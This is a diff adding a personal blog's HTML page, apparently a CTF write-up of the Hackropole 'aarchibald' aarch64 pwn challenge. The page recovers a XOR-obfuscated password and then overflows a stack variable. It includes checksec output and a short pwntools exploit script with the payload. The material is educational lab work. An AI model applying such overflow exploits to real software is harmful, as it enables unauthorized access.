@@ -1,0 +1,190 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>0xb0tm4n&#x27;s website</title>
+  <script src="https://cdn.jsdelivr.net/npm/js-cookie@3.0.5/dist/js.cookie.min.js"
+    integrity="sha256-WCzAhd2P6gRJF9Hv3oOOd+hFJi/QJbv+Azn4CGB8gfY=" crossorigin="anonymous" defer></script>
+  <script src="/js/index.js" defer></script>
+  <script src="/js/prompt.js" defer></script>
+  <script src="/js/keyboard.js" defer></script>
+  <script src="/js/tab.js" defer></script>
+  <script src="/js/commands.js" defer></script>
+  <script src="/js/config.js" defer></script><link rel="stylesheet" href="/css/base.css"><link rel="stylesheet" href="/css/page.css"></head><body onkeydown='exec(event)' style='background-image: url("/assets/background.jpg");'><main>
+      <div class="files" id="files" tabindex="0">
+<ul>
+  <li class="file">
+    <span><a href='https://super-botman.github.io/readme/'
+      tabindex="0">  README</a></span>
+  </li>
+
+<li class="folder"><span>
+      <a href='https://super-botman.github.io/pwn/'
+        tabindex="0">  Pwn
+      </a>
+    </span>
+
+    <ul>
+      
+      
+        
+        
+          
+<li>
+<span>└──
+  <a href='https://super-botman.github.io/pwn/writeups/'
+    tabindex="0">  Writeups
+  </a>
+</span>
+
+
+  <ul>
+
+  
+  <li class="file">
+    <span>└──
+      <a href='https://super-botman.github.io/pwn/writeups/robot/'
+        tabindex="0">  FCSC 2023 | Robot</a>
+    </span>
+  </li><li class="file">
+    <span>└──
+      <a href='https://super-botman.github.io/pwn/writeups/bigorneau/'
+        tabindex="0">  FCSC 2025 | Bigorneau</a>
+    </span>
+  </li><li class="file">
+    <span>└──
+      <a href='https://super-botman.github.io/pwn/writeups/http3/'
+        tabindex="0">  FCSC 2025 | HTTP3</a>
+    </span>
+  </li><li class="file">
+    <span>└──
+      <a href='https://super-botman.github.io/pwn/writeups/small-prime-shellcode/'
+        tabindex="0">  FCSC 2025 | Small Prime Shellcode</a>
+    </span>
+  </li><li class="file">
+    <span>└──
+      <a class="selected"href='https://super-botman.github.io/pwn/writeups/aarchibald/'
+        tabindex="0">  Hackropole | Aarchibald</a>
+    </span>
+  </li><li class="file">
+    <span>└──
+      <a href='https://super-botman.github.io/pwn/writeups/alfred/'
+        tabindex="0">  Hackropole | Alfred</a>
+    </span>
+  </li><li class="file">
+    <span>└──
+      <a href='https://super-botman.github.io/pwn/writeups/armigo/'
+        tabindex="0">  Hackropole | Armigo</a>
+    </span>
+  </li><li class="file">
+    <span>└──
+      <a href='https://super-botman.github.io/pwn/writeups/pwn103/'
+        tabindex="0">  THM | pwn101 task 103</a>
+    </span>
+  </li></ul>
+</li>
+
+        
+    </ul>
+  </li><li class="folder"><span>
+      <a href='https://super-botman.github.io/web/'
+        tabindex="0">  Web
+      </a>
+    </span>
+
+    <ul>
+      
+      
+        
+        
+          
+<li>
+<span>└──
+  <a href='https://super-botman.github.io/web/writeups/'
+    tabindex="0">  Writeups
+  </a>
+</span>
+
+
+  <ul>
+
+  
+  <li class="file">
+    <span>└──
+      <a href='https://super-botman.github.io/web/writeups/boiler/'
+        tabindex="0">  THM | Boiler</a>
+    </span>
+  </li><li class="file">
+    <span>└──
+      <a href='https://super-botman.github.io/web/writeups/thomghost/'
+        tabindex="0">  THM | Thomghost</a>
+    </span>
+  </li></ul>
+</li>
+
+        
+    </ul>
+  </li>
+</ul>
+</div>
+      <div class="viewer page" id="viewer" tabindex="0">
+        <div class="tab">
+<div class="file-manager" onclick='document.getElementById("files").classList.toggle("open"); document.getElementById("content").classList.toggle("close")'> </div>
+<ul id="tabs">
+</ul>
+
+
+</div>
+        <div class="content" id="content"><h1 id="pwn-aarchibald-hackropole">[Pwn] aarchibald | hackropole</h1>
+<ul>
+<li><a href="https://super-botman.github.io/pwn/writeups/aarchibald/#checksec">1. Checksec</a></li>
+<li><a href="https://super-botman.github.io/pwn/writeups/aarchibald/#writeup">2. Writeup</a></li>
+<li><a href="https://super-botman.github.io/pwn/writeups/aarchibald/#full-exploit">3. Full exploit</a></li>
+</ul>
+<h2 id="checksec">Checksec</h2>
+<pre data-lang="bash" style="background-color:#1a1b26;color:#c0caf5;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#7aa2f7;">[*] </span><span style="color:#89ddff;">&#39;</span><span style="color:#9ece6a;">/home/botman/Documents/cybersec/CTF/solo/hackropole/pwn/aarchibald/aarchibald</span><span style="color:#89ddff;">&#39;
+</span><span>    </span><span style="color:#7aa2f7;">Arch:     aarch64-64-little
+</span><span>    </span><span style="color:#7aa2f7;">RELRO:    Partial RELRO
+</span><span>    </span><span style="color:#7aa2f7;">Stack:    No canary found
+</span><span>    </span><span style="color:#7aa2f7;">NX:       NX enabled
+</span><span>    </span><span style="color:#7aa2f7;">PIE:      PIE enabled
+</span></code></pre>
+<h2 id="writeup">Writeup</h2>
+<p>Firstly we're gonna open our binary into a decompiler and we can directly see that there is a loop which will XOR our input with 0x32 value and then compare the 13 first bytes of the result with another value at the address 0xc30
+<img src="/images/aarchibald/xor_strcmp.png" alt="xor + strcmp" /></p>
+<p>So we're gonna see what's hidden at this address and we find this</p>
+<p><img src="/images/aarchibald/xored_password.png" alt="xored password" /></p>
+<p>Ok, cool we have the password XORed and the key so we juste have to decrypt it</p>
+<p><img src="/images/aarchibald/password.png" alt="password" /></p>
+<p>So we have the password we're left with one step wich is to pass the last check before our shell</p>
+<p><img src="/images/aarchibald/bof.png" alt="bof" /></p>
+<p>We see that there is only one variable on the stack which contains a value and to get our chall we have to overwrite it with another value, it's a basic buffer oveflow, so we just have to add a lot of A on the end of our password and tadaaa</p>
+<p><img src="/images/aarchibald/win.png" alt="win" /></p>
+<h2 id="full-exploit">Full exploit</h2>
+<pre data-lang="python" style="background-color:#1a1b26;color:#c0caf5;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#7dcfff;">from </span><span>pwn </span><span style="color:#7dcfff;">import </span><span style="color:#ff9e64;">*
+</span><span>
+</span><span style="color:#bb9af7;">def </span><span style="color:#7aa2f7;">exploit</span><span style="color:#9abdf5;">(</span><span style="color:#e0af68;">io</span><span style="color:#89ddff;">, </span><span style="color:#e0af68;">elf</span><span style="color:#89ddff;">, </span><span style="color:#e0af68;">libc</span><span style="color:#89ddff;">=</span><span style="color:#ff9e64;">None</span><span style="color:#9abdf5;">):
+</span><span>    payload </span><span style="color:#89ddff;">= </span><span style="color:#bb9af7;">b</span><span style="color:#89ddff;">&#39;</span><span style="color:#9ece6a;">SuPerpAsSworDAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><span style="color:#89ddff;">&#39; 
+</span><span>    </span><span style="color:#7aa2f7;">io</span><span style="color:#89ddff;">.</span><span style="color:#7aa2f7;">sendlineafter</span><span style="color:#9abdf5;">(</span><span style="color:#89ddff;">&#39;</span><span style="color:#9ece6a;">:</span><span style="color:#89ddff;">\n&#39;, </span><span style="color:#7aa2f7;">payload</span><span style="color:#9abdf5;">)
+</span><span>    </span><span style="color:#7aa2f7;">io</span><span style="color:#89ddff;">.</span><span style="color:#7aa2f7;">interactive</span><span style="color:#9abdf5;">()
+</span></code></pre>
+<p><a href="/exploits/aarchibald.py">download here</a></p>
+<p>written by <em>0xB0tm4n</em></p>
+
+        </div>
+      </div>
+      <div class="prompt" id="terminal"><input
+    type="text"
+    id="setter"
+    onkeydown="writeit(this, event);moveIt(this.value.length, event)"
+    onchange="writeit(this, event)"
+    onkeyup="writeit(this, event)"
+    onkeypress="writeit(this, event);"
+    >
+<label for="setter" id="writer"> </label><b class="cursor" id="cursor"></b></div>
+    </main>
+  </body>
+
+</html>
